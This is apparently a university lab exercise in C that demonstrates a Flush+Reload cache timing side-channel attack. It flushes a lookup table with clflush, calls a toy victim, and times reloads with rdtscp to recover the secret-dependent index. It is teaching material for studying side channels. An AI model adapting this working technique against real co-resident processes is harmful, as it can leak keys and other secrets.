/*
*   Copyright © 2019
*
*   Francisco Javier Blázquez Martínez ~ frblazqu@ucm.es
*
*   Double degree in Mathematics-Computer engineering.
*   Complutense university, Madrid.
*
*   Description:
*/


#include <emmintrin.h>
#include <stdint.h>
#include <stdio.h>
#include <x86intrin.h>
#include <stdlib.h>

uint8_t LUT[256 * 512];
const int forward[256] = {145,184,23,80,4,191,94,133,164,244,207,178,47,157,225,18,102,235,125,19,242,40,168,189,15,9,139,116,218,106,56,212,224,159,219,255,107,72,28,211,45,234,39,62,114,248,194,213,243,51,193,196,64,221,245,252,52,61,144,162,120,108,55,155,13,98,216,0,46,209,152,29,35,73,53,131,93,233,57,66,203,96,31,117,12,186,43,105,17,156,63,166,205,214,115,84,177,174,121,149,241,190,200,5,26,86,104,206,48,27,38,87,182,77,188,42,195,22,76,163,134,119,41,239,185,3,227,58,183,88,109,217,85,240,222,160,89,100,59,81,129,175,179,20,253,36,136,204,199,113,60,34,161,8,132,142,143,127,49,122,237,7,180,67,78,33,90,6,150,140,172,197,110,220,103,146,123,247,228,232,91,187,154,126,249,254,202,70,25,135,1,231,30,14,230,10,167,37,181,173,210,68,128,238,11,215,246,74,165,170,71,169,65,79,208,54,83,251,148,226,171,198,21,2,141,229,16,192,32,223,82,101,124,153,151,44,138,69,147,112,158,118,75,236,50,97,201,137,130,99,92,111,176,95,24,250};

int victim(int input) {
  int index = (input * 163) & 0xFF;
  volatile int internal_value = LUT[index * 512];
  return (internal_value * 233) & 0xFFFF;
}

void attack(int input) {
  // threshold depends on processors
  const int THRESHOLD = 60;

  // measure the access count of each block
  int hit_count[256] = {0};

  // repeat the attack to improve precision
  for (int rep = 0; rep < 100; ++rep) {
    // flush LUT from the cache
    for (int i = 0; i < 256; i++) {
      _mm_clflush(&LUT[i * 512]);
    }

    // wait for clflush to commit
    for (volatile int i = 0; i < 100; i++);

    // memory fence
    _mm_mfence();

    // call the victim function
    victim(input);

    for (int i = 0; i < 256; ++i) {
      volatile unsigned int junk = 0;
      uint64_t s0 = __rdtscp((uint32_t *)&junk);
      junk = LUT[forward[i] * 512]; // read it
      uint64_t delta = __rdtscp((uint32_t *)&junk) - s0;
      // check if it is less than the threshold
      if (delta < THRESHOLD) hit_count[forward[i]]++;
    }
  }

  // find the index with maximum probability
  int guessed_index = 0;
  uint64_t max_count = 0;

  for (int i = 0; i < 256; i++) {
    if (hit_count[i] > max_count) {
      max_count = hit_count[i];
      guessed_index = i;
    }
    // printing the distribution of the hit count
    printf("%4d: %4d\t", i, hit_count[i]);
    if (i % 8 == 7) printf("\n");
  }
  // compute the expected index
  int oracle_index = (input * 163) & 0xFF;

  // print the attack result
  printf("Attack index: %d, Correct index: %d \n", guessed_index, oracle_index);
}

int main() {
  // initialize the LUT
  for (int i = 0; i < 256; i++) {
    LUT[i * 512] = rand();
  }

  // perform the attack
  attack(10);
  attack(35);
  attack(100);

  // you may add more testing cases here

  return 0;
}
